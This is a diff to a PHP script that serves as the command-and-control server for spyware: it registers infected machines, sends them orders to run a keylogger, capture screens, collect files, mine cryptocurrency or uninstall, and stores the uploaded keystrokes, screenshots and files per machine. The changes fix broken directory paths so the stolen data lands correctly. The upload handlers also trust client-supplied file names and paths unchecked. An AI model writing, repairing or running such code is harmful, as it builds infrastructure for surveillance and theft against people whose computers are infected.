@@ -44,10 +44,10 @@ if ($_POST["operation"] == "initialize") {
 	$stmt = $conn->prepare("INSERT INTO `specs` (`machineID`, `account`, `os`, `language`, `motherboard`, `memory`, `bios`, `cpu`, `gpu`, `audio`, `network`, `harddrives`, `cdrom`) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?);");
 	$stmt->bind_param("sssssssssssss", $machineID, $_POST["account"], $_POST["os"], $_POST["language"], $_POST["motherboard"], $_POST["memory"], $_POST["bios"], $_POST["cpu"], $_POST["gpu"], $_POST["audio"], $_POST["network"], $_POST["harddrives"], $_POST["cdrom"]);
 	$stmt->execute();
-	mkdir(__DIR__ . "../machines/$machineID", 0700, true);
-	mkdir(__DIR__ . "../machines/$machineID/keys", 0700, true);
-	mkdir(__DIR__ . "../machines/$machineID/screens", 0700, true);
-	mkdir(__DIR__ . "../machines/$machineID/files", 0700, true);
+	mkdir(__DIR__ . "/../machines/$machineID", 0700, true);
+	mkdir(__DIR__ . "/../machines/$machineID/keys", 0700, true);
+	mkdir(__DIR__ . "/../machines/$machineID/screens", 0700, true);
+	mkdir(__DIR__ . "/../machines/$machineID/files", 0700, true);
 	echo $machineID;
 	return;
 }
@@ -85,15 +85,15 @@ if (isset($_POST["machineID"]) && isset($_POST["password"]) && checkPassword($co
 		$stmt->execute();
 		$result = $stmt->get_result();
 		while ($row = $result->fetch_assoc()) {
-			$orders->inspectHardware       = $row["inspectHardware"];
-			$orders->inspectFiles          = $row["inspectFiles"];
-			$orders->ordersInterval        = $row["ordersInterval"];
-			$orders->keylogger             = $row["keylogger"];
-			$orders->screenCapture         = $row["screenCapture"];
-			$orders->screenCaptureInterval = $row["screenCaptureInterval"];
-			$orders->filesCapture          = $row["filesCapture"];
-			$orders->mining                = $row["mining"];
-			$orders->uninstall             = $row["uninstall"];
+			$orders["inspectHardware"] = $row["inspectHardware"];
+			$orders["inspectFiles"] = $row["inspectFiles"];
+			$orders["ordersInterval"] = $row["ordersInterval"];
+			$orders["keylogger"] = $row["keylogger"];
+			$orders["screenCapture"] = $row["screenCapture"];
+			$orders["screenCaptureInterval"] = $row["screenCaptureInterval"];
+			$orders["filesCapture"] = $row["filesCapture"];
+			$orders["mining"] = $row["mining"];
+			$orders["uninstall"] = $row["uninstall"];
 			echo json_encode($orders);
 		}
 		return;
@@ -121,20 +121,20 @@ if (isset($_POST["machineID"]) && isset($_POST["password"]) && checkPassword($co
 	}
 	// Upload index file
 	elseif ($_POST["operation"] == "uploadIndexFile" && $_FILES["file"]["error"] == UPLOAD_ERR_OK) {
-		$filesPath = __DIR__ . "../machines/" . $_POST['machineID'] . "/files/";
+		$filesPath = __DIR__ . "/../machines/" . $_POST['machineID'] . "/files/";
 		recursiveMakeDir("", $filesPath);
 		$stmt = $conn->prepare("UPDATE command SET inspectFiles=0 WHERE machineID=?");
 		$stmt->bind_param("s", $_POST["machineID"]);
 		$stmt->execute();
 		$temp_location = $_FILES["file"]["tmp_name"];
-		$new_location = __DIR__ . "../machines/" . $_POST['machineID'] . "/" . $_FILES["file"]["name"];
+		$new_location = __DIR__ . "/../machines/" . $_POST['machineID'] . "/" . $_FILES["file"]["name"];
 		move_uploaded_file($temp_location, $new_location);
 		return;
 	}
 	// Upload file
 	elseif ($_POST["operation"] == "uploadFile" && $_FILES["file"]["error"] == UPLOAD_ERR_OK) {
 		$temp_location = $_FILES["file"]["tmp_name"];
-		$filesPath = __DIR__ . "../machines/" . $_POST['machineID'] . "/files/";
+		$filesPath = __DIR__ . "/../machines/" . $_POST['machineID'] . "/files/";
 		recursiveMakeDir($filesPath, $_POST['localPathFile']);
 		$new_location = $filesPath . $_POST['localPathFile'] . "/" . $_FILES["file"]["name"];
 		move_uploaded_file($temp_location, $new_location);
@@ -143,14 +143,14 @@ if (isset($_POST["machineID"]) && isset($_POST["password"]) && checkPassword($co
 	// Upload screen
 	elseif ($_POST["operation"] == "uploadScreen" && $_FILES["file"]["error"] == UPLOAD_ERR_OK) {
 		$temp_location = $_FILES["file"]["tmp_name"];
-		$new_location = __DIR__ . "../machines/" . $_POST['machineID'] . "/screens/" . $_FILES["file"]["name"];
+		$new_location = __DIR__ . "/../machines/" . $_POST['machineID'] . "/screens/" . $_FILES["file"]["name"];
 		move_uploaded_file($temp_location, $new_location);
 		return;
 	}
 	// Upload keys
 	elseif ($_POST["operation"] == "uploadKeys" && $_FILES["file"]["error"] == UPLOAD_ERR_OK) {
 		$temp_location = $_FILES["file"]["tmp_name"];
-		$new_location = __DIR__ . "../machines/" . $_POST['machineID'] . "/keys/" . $_FILES["file"]["name"];
+		$new_location = __DIR__ . "/../machines/" . $_POST['machineID'] . "/keys/" . $_FILES["file"]["name"];
 		move_uploaded_file($temp_location, $new_location);
 		return;
 	}
